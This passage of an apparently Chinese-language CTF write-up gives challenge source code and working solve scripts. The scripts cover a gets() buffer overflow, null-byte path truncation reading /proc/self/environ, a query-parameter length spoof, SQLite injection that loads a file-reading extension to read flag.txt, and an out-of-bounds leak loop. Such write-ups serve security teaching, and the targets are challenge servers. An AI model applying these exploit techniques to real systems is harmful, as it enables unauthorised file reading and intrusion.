&lt;a:folHlink&gt;&lt;a:srgbClr val=&quot;800080&quot;/&gt;&lt;/a:folHlink&gt; &lt;/a:clrScheme&gt; &lt;a:fmtScheme name=&quot;CustomFmt&quot;&gt; &lt;a:fillStyleLst&gt; &lt;a:solidFill&gt;&lt;a:srgbClr val=&quot;FFFFFF&quot;/&gt;&lt;/a:solidFill&gt; &lt;/a:fillStyleLst&gt; &lt;a:lnStyleLst/&gt; &lt;a:effectStyleLst/&gt; &lt;/a:fmtScheme&gt; &lt;/a:themeElements&gt; &lt;a:objectDefaults/&gt; &lt;a:extraClrSchemeLst/&gt;&lt;/a:theme&gt; 1bctf&#123;docx_is_zip&#125; Viewer 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#include &lt;stdbool.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;typedef enum &#123; INVALID, FIBONACCI, ART, FLAG, RANDOM&#125; viewee_t;void handle_viewee(viewee_t viewee) &#123; int a, b, c; int i; FILE *file; char flag_char; switch (viewee) &#123; case INVALID: printf(&quot;Error: Unauthorized or invalid input\\n&quot;); break; case FIBONACCI: a = 0; b = 1; for (i = 0; i &lt; 10; i++) &#123; c = a + b; a = b; b = c; printf(&quot;%i: %i\\n&quot;, i, a); &#125; break; case ART: printf(&quot; ||/\\\\\\n&quot; &quot; || \\\\\\n&quot; &quot; | \\\\\\n&quot; &quot; /______\\\\\\n&quot; &quot;/| |\\\\\\n&quot; &quot; | || |\\n&quot; &quot; |__||__|\\n&quot;); break; case FLAG: file = fopen(&quot;flag.txt&quot;, &quot;r&quot;); while (fread(&amp;flag_char, sizeof(flag_char), 1, file) == sizeof(flag_char)) &#123; putchar(flag_char); &#125; putchar(&#x27;\\n&#x27;); fclose(file); break; case RANDOM: printf(&quot;Rand: %i\\n&quot;, rand()); break; &#125;&#125;int main() &#123; viewee_t viewee = INVALID; char input[10]; bool is_admin = false; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); printf(&quot;What would you like to view?\\n&gt; &quot;); gets(input); if (strcmp(input, &quot;fibonacci&quot;) == 0) &#123; viewee = FIBONACCI; &#125; else if (strcmp(input, &quot;art&quot;) == 0) &#123; viewee = ART; &#125; else if (strcmp(input, &quot;flag&quot;) == 0 &amp;&amp; is_admin) &#123; viewee = FLAG; &#125; else if (strcmp(input, &quot;random&quot;) == 0) &#123; viewee = RANDOM; &#125; handle_viewee(viewee); return 0;&#125; 不难发现buffer overflow的漏洞： 123char input[10];gets(input); 所以我们直接越界写入将admin修改成1即可： 12345678910111213from pwn import *context.log_level = &#x27;info&#x27;r = remote(&quot;viewer.challs.pwnoh.io&quot;, 1337, ssl=True)offset = 10payload = b&quot;flag\\x00&quot; + b&quot;A&quot;*(offset - len(&quot;flag&quot;)) + b&quot;\\x01&quot;r.sendlineafter(b&quot;&gt; &quot;, payload)print(r.recvall())# bctf&#123;I_C4nt_Enum3rAte_7hE_vuLn3r4biliTI3s&#125; WebAwklet 首先注意到网站会把我们输入的font_name和 .txt 直接拼接。并且自带的 urldecode() 会把 %00 还原到实际字节流。所以在底层文件打开（getline &lt; filename → fopen()）时，路径里的 \\x00 被视为字符串终止，从而把后缀 .txt 截掉。 也就是说我们可以读取任意文件，比如说传 font=/etc/passwd%00 实际打开的是 /etc/passwd。并且由于读到的文件会被当作“字体”，按照 7 行 = 1 块 缓存在数组里；请求参数 name 的字符编码（从 ASCII 32 起）选择第几块输出。所以我们可以稳定地按块泄露任意文件内容。 最简单的方法： 123456789└─$ curl -s &#x27;https://awklet.challs.pwnoh.io/cgi-bin/awklet.awk?font=/proc/self/environ%00&amp;name=%20&#x27; \\| tr &#x27;\\0&#x27; &#x27;\\n&#x27; | grep -aoE &#x27;bctf\\&#123;[^&#125;]*\\&#125;&#x27;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125;bctf&#123;n3xt_t1m3_1m_wr171ng_1t_1n_53d&#125; 访问这个 URL 时，发生的是这几步—— 1. Apache 作为 CGI 启动 awk 脚本 相当于执行了（由 Apache 发起，不是你能下命令）： 1/bin/awk -f /usr/lib/cgi-bin/awklet.awk 并给它一堆环境变量，其中最关键的是： 1QUERY_STRING=&quot;font=/proc/self/environ%00&amp;name=%20&quot; 2. awk 脚本解析参数并做 NUL 截断 脚本把 %00 还原成真实的 \\x00，于是： 12font_name = &quot;/proc/self/environ\\0&quot;filename = font_name &quot;.txt&quot; # 逻辑上是 &quot;/proc/self/environ\\0.txt&quot; 底层 getline &lt; filename 调用文件打开函数时，\\0 会截断后面的 .txt，于是实际打开的是： 1/proc/self/environ 3. awk 用 getline 读文件，不是跑外部命令 核心相当于（伪代码）： 123while ((getline line &lt; &quot;/proc/self/environ&quot;) &gt; 0) &#123; font[char, row] = line # 每 7 行算一“块”&#125; 然后根据 name=%20（空格，ASCII 32，对应第 1 块）把前 7 行打印出来，并带上 CGI 头： 12345Status: 200 OKContent-type: text/plainHere&#x27;s your /proc/self/environ ascii art:&lt;……7 行内容……&gt; 如果用“系统调用”视角来比喻，大概就是： 1234execve(&quot;/bin/awk&quot;, [&quot;/bin/awk&quot;,&quot;-f&quot;,&quot;/usr/lib/cgi-bin/awklet.awk&quot;], ENV)open(&quot;/proc/self/environ&quot;, O_RDONLY)read(...)write(1, &quot;Status: 200 OK\\r\\nContent-type: text/plain\\r\\n\\r\\n...&quot;, ...) 所以，这个 URL 的效果等价于让 CGI 进程自己打开并读取 /proc/self/environ，并把其中前 7 行通过 HTTP 响应回显出来——没有额外的外部命令被执行。 BIG CHUNGUS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271import express from &quot;express&quot;;const app = express();app.get(&quot;/&quot;, (req, res) =&gt; &#123; if (!req.query.username) &#123; res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;NO CHUNGUS&lt;/title&gt; &lt;style&gt; body &#123; font-family: Comic Sans MS; background: linear-gradient(45deg, #ff0000, #00ff00, #0000ff); animation: rainbow 2s infinite; text-align: center; padding: 50px; &#125; @keyframes rainbow &#123; 0% &#123; background-position: 0% 50%; &#125; 50% &#123; background-position: 100% 50%; &#125; 100% &#123; background-position: 0% 50%; &#125; &#125; h1 &#123; font-size: 100px; color: white; text-shadow: 5px 5px black; &#125; img &#123; width: 300px; border: 10px solid yellow; animation: spin 1s infinite; &#125; @keyframes spin &#123; from &#123; transform: rotate(0deg); &#125; to &#123; transform: rotate(360deg); &#125; &#125; .marquee &#123; font-size: 50px; color: lime; animation: marquee 3s linear infinite; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;NO CHUNGUS DETECTED&lt;/h1&gt; &lt;div class=&quot;marquee&quot;&gt;⚠️ WARNING: NO CHUNGUS FOUND ⚠️&lt;/div&gt; &lt;img src=&quot;https://i.imgflip.com/aaxz3e.jpg&quot; alt=&quot;NO CHUNGUS&quot; onerror=&quot;this.src=&#x27;data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Ctext x=%220%22 y=%2215%22 font-size=%2220%22%3ENO CHUNGUS%3C/text%3E%3C/svg%3E&#x27;&quot;&gt; &lt;p style=&quot;font-size: 30px; color: red;&quot;&gt;😢 WHERE IS CHUNGUS? 😢&lt;/p&gt; &lt;form method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Enter username...&quot; style=&quot;font-size: 20px; padding: 10px;&quot;&gt; &lt;button type=&quot;submit&quot; style=&quot;font-size: 20px; padding: 10px;&quot;&gt;CHECK CHUNGUS&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; `); return; &#125; if (req.query.username.length &gt; 0xB16_C4A6A5) &#123; res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;BIG CHUNGUS!!!&lt;/title&gt; &lt;style&gt; body &#123; font-family: Impact, Arial Black; background: repeating-linear-gradient(45deg, #ff0000, #ff0000 10px, #ffff00 10px, #ffff00 20px); text-align: center; padding: 20px; animation: shake 0.5s infinite; &#125; @keyframes shake &#123; 0%, 100% &#123; transform: translate(0, 0); &#125; 25% &#123; transform: translate(-10px, 10px); &#125; 75% &#123; transform: translate(10px, -10px); &#125; &#125; h1 &#123; font-size: 150px; color: #ff00ff; text-shadow: 10px 10px 0px #00ffff, 20px 20px 0px #ffff00; animation: pulse 0.3s infinite; &#125; @keyframes pulse &#123; 0%, 100% &#123; transform: scale(1); &#125; 50% &#123; transform: scale(1.1); &#125; &#125; img &#123; width: 500px; border: 20px dashed lime; animation: zoom 0.5s infinite alternate; &#125; @keyframes zoom &#123; from &#123; transform: scale(1); &#125; to &#123; transform: scale(1.2); &#125; &#125; .username &#123; font-size: 40px; color: white; background: black; padding: 10px; &#125; .blink &#123; animation: blink 0.5s infinite; &#125; @keyframes blink &#123; 0%, 50% &#123; opacity: 1; &#125; 51%, 100% &#123; opacity: 0; &#125; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;BIG CHUNGUS!!!&lt;/h1&gt; &lt;div class=&quot;username blink&quot;&gt;Welcome, $&#123;req.query.username&#125;!&lt;/div&gt; &lt;img src=&quot;https://purepng.com/public/uploads/large/big-chungus-jkg.png&quot; alt=&quot;BIG CHUNGUS&quot; onerror=&quot;this.src=&#x27;data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Ctext x=%220%22 y=%2215%22 font-size=%2220%22%3EBIG CHUNGUS%3C/text%3E%3C/svg%3E&#x27;&quot;&gt; &lt;p style=&quot;font-size: 50px; color: white; background: red; padding: 20px;&quot;&gt;🎉 YOU FOUND THE BIGGEST CHUNGUS! 🎉&lt;/p&gt; &lt;p style=&quot;font-size: 30px; color: lime;&quot;&gt;FLAG: $&#123; process.env.FLAG || &quot;FLAG_NOT_SET&quot; &#125;&lt;/p&gt; &lt;marquee style=&quot;font-size: 60px; color: yellow;&quot;&gt;BIG CHUNGUS IS HERE BIG CHUNGUS IS HERE BIG CHUNGUS IS HERE&lt;/marquee&gt; &lt;form method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Enter username...&quot; style=&quot;font-size: 20px; padding: 10px;&quot;&gt; &lt;button type=&quot;submit&quot; style=&quot;font-size: 20px; padding: 10px;&quot;&gt;CHECK CHUNGUS&lt;/button&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; `); return; &#125; res.send(`&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;little chungus - so very sad&lt;/title&gt; &lt;style&gt; body &#123; font-family: &#x27;Times New Roman&#x27;, serif; background: linear-gradient(to bottom, #1a1a2e, #16213e, #0f3460); text-align: center; padding: 30px; color: #e0e0e0; position: relative; overflow: hidden; min-height: 100vh; &#125; .rain &#123; position: absolute; width: 100%; height: 100%; top: 0; left: 0; pointer-events: none; z-index: 0; &#125; .drop &#123; position: absolute; width: 2px; height: 50px; background: rgba(150, 200, 255, 0.5); animation: fall linear infinite; animation-duration: var(--duration); animation-delay: var(--delay); left: var(--left); top: -50px; &#125; @keyframes fall &#123; to &#123; top: 100vh; opacity: 0; &#125; &#125; .content &#123; position: relative; z-index: 1; &#125; h1 &#123; font-size: 80px; color: #a0a0a0; text-shadow: 3px 3px 10px rgba(0,0,0,0.8); animation: fadeInOut 3s ease-in-out infinite; margin: 20px 0; &#125; @keyframes fadeInOut &#123; 0%, 100% &#123; opacity: 0.5; &#125; 50% &#123; opacity: 1; &#125; &#125; h2 &#123; font-size: 40px; color: #888; margin: 30px 0; font-style: italic; &#125; .username &#123; font-size: 28px; color: #bbb; margin: 30px 0; padding: 15px; background: rgba(0,0,0,0.3); border-left: 5px solid #555; &#125; img &#123; width: 250px; border: 5px solid #555; opacity: 0.7; filter: grayscale(70%); animation: shrink 2s ease-in-out infinite; margin: 20px 0; &#125; @keyframes shrink &#123; 0%, 100% &#123; transform: scale(1); &#125; 50% &#123; transform: scale(0.95); &#125; &#125; .sad-message &#123; font-size: 24px; color: #999; margin: 30px 20px; line-height: 1.8; font-style: italic; &#125; .tears &#123; font-size: 60px; animation: cry 1s ease-in-out infinite; margin: 20px 0; &#125; @keyframes cry &#123; 0%, 100% &#123; transform: translateY(0); &#125; 50% &#123; transform: translateY(10px); &#125; &#125; form &#123; margin-top: 40px; padding: 20px; background: rgba(0,0,0,0.4); border-radius: 10px; display: inline-block; &#125; input, button &#123; font-size: 18px; padding: 10px; background: #2a2a3e; color: #ddd; border: 1px solid #555; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;rain&quot; id=&quot;rain&quot;&gt;&lt;/div&gt; &lt;div class=&quot;content&quot;&gt; &lt;div class=&quot;tears&quot;&gt;😢 💧 😭&lt;/div&gt; &lt;h1&gt;little chungus&lt;/h1&gt; &lt;h2&gt;so very, very little...&lt;/h2&gt; &lt;div class=&quot;username&quot;&gt;Welcome, $&#123;req.query.username&#125;...&lt;/div&gt; &lt;img src=&quot;https://images.steamusercontent.com/ugc/943958709953537755/556C9BC26D0E7261242A75A13AF865DA892DFEBC/?imw=5000&amp;imh=5000&amp;ima=fit&amp;impolicy=Letterbox&amp;imcolor=%23000000&amp;letterbox=false&quot; alt=&quot;little chungus&quot; onerror=&quot;this.src=&#x27;data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22%3E%3Ctext x=%220%22 y=%2215%22 font-size=%2220%22%3Elittle chungus%3C/text%3E%3C/svg%3E&#x27;&quot;&gt; &lt;div class=&quot;sad-message&quot;&gt; &lt;p&gt;😢 It is truly a tragedy... The chungus is so very, very little...&lt;/p&gt; &lt;p&gt;💔 Why must the chungus suffer so? Why must it be so small?&lt;/p&gt; &lt;p&gt;🌧️ The universe weeps for this tiny chungus...&lt;/p&gt; &lt;p&gt;😞 One day, perhaps, the chungus will grow... but today is not that day...&lt;/p&gt; &lt;p&gt;💧 We can only hope... and dream... of a BIGGER chungus...&lt;/p&gt; &lt;/div&gt; &lt;form method=&quot;GET&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;Try again... maybe...&quot;&gt; &lt;button type=&quot;submit&quot;&gt;Search for Hope&lt;/button&gt; &lt;/form&gt; &lt;/div&gt; &lt;script&gt; const rain = document.getElementById(&#x27;rain&#x27;); for (let i = 0; i &lt; 50; i++) &#123; const drop = document.createElement(&#x27;div&#x27;); drop.className = &#x27;drop&#x27;; drop.style.setProperty(&#x27;--left&#x27;, Math.random() * 100 + &#x27;%&#x27;); drop.style.setProperty(&#x27;--duration&#x27;, (Math.random() * 2 + 1) + &#x27;s&#x27;); drop.style.setProperty(&#x27;--delay&#x27;, Math.random() * 2 + &#x27;s&#x27;); rain.appendChild(drop); &#125; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; `);&#125;);app.listen(3000, () =&gt; &#123; console.log(&quot;Server running on port 3000&quot;);&#125;); 注意到这里的判断条件： 1if (req.query.username.length &gt; 0xB16_C4A6A5) 0xB16_C4A6A5 对应的十进制数是47626626725。我们只需要让我们输入的名字的长度大于这个数即可。但直接输入那么长的名字肯定不现实，所以我们可以直接给设置一个length属性。所以我们直接访问： 1https://big-chungus.challs.pwnoh.io/?username[length]=47626626726 即可看到flag： 1bctf&#123;b16_chun6u5_w45_n3v3r_7h15_b16&#125; 成功后的这个页面它还一直在晃，我说实话这真的有点精神污染了… Packages 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687import sqlite3import jsonfrom flask import Flask, request, render_template_stringapp = Flask(__name__)db = sqlite3.connect(&quot;packages.db&quot;, check_same_thread=False)db.enable_load_extension(True)db.row_factory = sqlite3.RowTEMPLATE = &quot;&quot;&quot;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;Package Search&lt;/title&gt; &lt;style&gt; body &#123; font-family: sans-serif; max-width: 800px; margin: 2rem auto; &#125; form &#123; margin-bottom: 1rem; &#125; table &#123; border-collapse: collapse; width: 100%; &#125; th, td &#123; border: 1px solid #ccc; padding: 0.5rem; text-align: left; &#125; th &#123; background: #f4f4f4; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;Package Search&lt;/h1&gt; &lt;form method=&quot;get&quot;&gt; &lt;label&gt;Distro: &lt;input name=&quot;distro&quot; value=&quot;&#123;&#123; request.args.get(&#x27;distro&#x27;, &#x27;&#x27;) &#125;&#125;&quot;&gt; &lt;/label&gt; &lt;label&gt;Package: &lt;input name=&quot;package&quot; value=&quot;&#123;&#123; request.args.get(&#x27;package&#x27;, &#x27;&#x27;) &#125;&#125;&quot;&gt; &lt;/label&gt; &lt;button type=&quot;submit&quot;&gt;Search&lt;/button&gt; &lt;/form&gt; &#123;% if results %&#125; &lt;h2&gt;Showing &#123;&#123; results|length &#125;&#125; result&#123;&#123; &#x27;s&#x27; if results|length != 1 else &#x27;&#x27; &#125;&#125;&lt;/h2&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;Distro&lt;/th&gt; &lt;th&gt;Distro Version&lt;/th&gt; &lt;th&gt;Package&lt;/th&gt; &lt;th&gt;Package Version&lt;/th&gt; &lt;/tr&gt; &#123;% for row in results %&#125; &lt;tr&gt; &lt;td&gt;&#123;&#123; row[&#x27;distro&#x27;] &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; row[&#x27;distro_version&#x27;] &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; row[&#x27;package&#x27;] &#125;&#125;&lt;/td&gt; &lt;td&gt;&#123;&#123; row[&#x27;package_version&#x27;] &#125;&#125;&lt;/td&gt; &lt;/tr&gt; &#123;% endfor %&#125; &lt;/table&gt; &#123;% else %&#125; &lt;p&gt;No results found.&lt;/p&gt; &#123;% endif %&#125;&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index(): distro = request.args.get(&quot;distro&quot;, &quot;&quot;).strip().lower() package = request.args.get(&quot;package&quot;, &quot;&quot;).strip().lower() sql = &quot;SELECT distro, distro_version, package, package_version FROM packages&quot; if distro or package: sql += &quot; WHERE &quot; if distro: sql += f&quot;LOWER(distro) = &#123;json.dumps(distro)&#125;&quot; if distro and package: sql += &quot; AND &quot; if package: sql += f&quot;LOWER(package) = &#123;json.dumps(package)&#125;&quot; sql += &quot; ORDER BY distro, distro_version, package&quot; print(sql) results = db.execute(sql).fetchall() return render_template_string(TEMPLATE, request=request, results=results)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=8000) 不难发现这道题是需要SQL injection。但是由于SQL本身的功能是不支持读取flag.txt文件的，所以需要先加载额外的extension，才能进行读取操作。 简单测试一下： 1a&quot; UNION SELECT &#x27;a&#x27;,&#x27;a&#x27;,&#x27;a&#x27;,&#x27;a&#x27; -- 按顺序依次尝试（在Distro栏输入以下）以下命令便可以拿到flag： 1. 利用load_extension来加载扩展： 1a&quot; UNION SELECT &#x27;a&#x27;,&#x27;a&#x27;,CAST(load_extension(&#x27;/sqlite/ext/misc/fileio.so&#x27;) AS TEXT),&#x27;a&#x27; -- 2. 利用扩展函数读 flag： 1a&quot; UNION SELECT &#x27;a&#x27;,&#x27;a&#x27;,readfile(&#x27;/app/flag.txt&#x27;),&#x27;a&#x27; -- 1bctf&#123;y0uv3_g0t_4n_apt17ud3_f0r_7h15&#125; ForensicsBugle 这道题我们会拿到一个mp3音频。仔细听（这个是重点，因为它吹的长短音不是很明显，所以主要靠耳朵听），并且用音频解析软件打开它来做更进一步的判断（主要是判断断点），就会得到摩斯密码： 12_ _ | _ _ _ | ._. | ... | . | ._ | ._.. | ._.. | ._ | ._.. | _ _ _ | _. | _ _ . m o r s e a l l a l o n g 所以flag就是： 1bctf&#123;morseallalong&#125; Big Data Analysis 这道题可以直接用 GitHub Archive 的 BigQuery 公共数据集 来查。这是专门存 GitHub 事件流（包括 CreateEvent）的数据库。 根据GitHub Archive官方页学习怎么在 BigQuery 里打开数据集。：https://www.gharchive.org/ 然后使用这个SQL语句查询： 123SELECT COUNT(DISTINCT repo.name) AS uniq_reposFROM `githubarchive.year.2023`WHERE type = &#x27;CreateEvent&#x27;; 1bctf&#123;63421480&#125; PwnCharacter assassination 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;char flag[64] = &quot;bctf&#123;fake_flag&#125;&quot;;char upper[] = &#123; &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;\\t&#x27;, &#x27;\\n&#x27;, &#x27;\\x0b&#x27;, &#x27;\\x0c&#x27;, &#x27;\\r&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &#x27;\\&#x27;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;[&#x27;, &#x27;\\\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;J&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;, &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;,&#125;;char lower[] = &#123; &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;\\t&#x27;, &#x27;\\n&#x27;, &#x27;\\x0b&#x27;, &#x27;\\x0c&#x27;, &#x27;\\r&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27;?&#x27;, &#x27; &#x27;, &#x27;!&#x27;, &#x27;&quot;&#x27;, &#x27;#&#x27;, &#x27;$&#x27;, &#x27;%&#x27;, &#x27;&amp;&#x27;, &#x27;\\&#x27;&#x27;, &#x27;(&#x27;, &#x27;)&#x27;, &#x27;*&#x27;, &#x27;+&#x27;, &#x27;,&#x27;, &#x27;-&#x27;, &#x27;.&#x27;, &#x27;/&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;, &#x27;:&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;?&#x27;, &#x27;@&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;[&#x27;, &#x27;\\\\&#x27;, &#x27;]&#x27;, &#x27;^&#x27;, &#x27;_&#x27;, &#x27;`&#x27;, &#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;g&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;j&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;&#123;&#x27;, &#x27;|&#x27;, &#x27;&#125;&#x27;, &#x27;~&#x27;,&#125;;int main() &#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); FILE *f = fopen(&quot;flag.txt&quot;, &quot;r&quot;); if (f) &#123; fgets(flag, sizeof(flag), f); fclose(f); &#125; char input[256]; while (1) &#123; printf(&quot;&gt; &quot;); if (!fgets(input, sizeof(input), stdin)) &#123; break; &#125; for (int i = 0; i &lt; sizeof(input) &amp;&amp; input[i]; i++) &#123; char c = input[i]; if (i % 2) &#123; printf(&quot;%c&quot;, upper[c]); &#125; else &#123; printf(&quot;%c&quot;, lower[c]); &#125; &#125; printf(&quot;\\n&quot;); &#125;&#125; 不难发现这里没有对我们输入的数字进行管控，所以我们可以直接越界一点一点读取flag的内容。在IDA里可以发现flag和upper在data里的位置非常靠近： 所以输入计算好的偏移数即可： 1234567891011121314151617181920212223from pwn import *context.log_level = &#x27;debug&#x27;p = remote(&quot;character-assassination.challs.pwnoh.io&quot;, 1337, ssl=True)def leak(n): &quot;&quot;&quot;泄露 flag[n]，n 从 0 开始&quot;&quot;&quot; idx = (0xC0 + n) &amp; 0xff # -0x40 + n payload = b&quot;A&quot; + bytes([idx]) + b&quot;\\n&quot; p.recvuntil(b&quot;&gt; &quot;) p.send(payload) line = p.recvline().rstrip(b&quot;\\n&quot;) return line[1:2] # 第二个字符是泄露字节flag = b&quot;&quot;for i in range(64): # flag[64] 恰好够用 b = leak(i) flag += b if b == b&quot;&#125;&quot;: breakprint(&quot;FLAG =&quot;, flag.decode(errors=&quot;replace&quot;))# FLAG = bctf&#123;wOw_YoU_sOlVeD_iT_665ff83d&#125; Cryptocube cipher 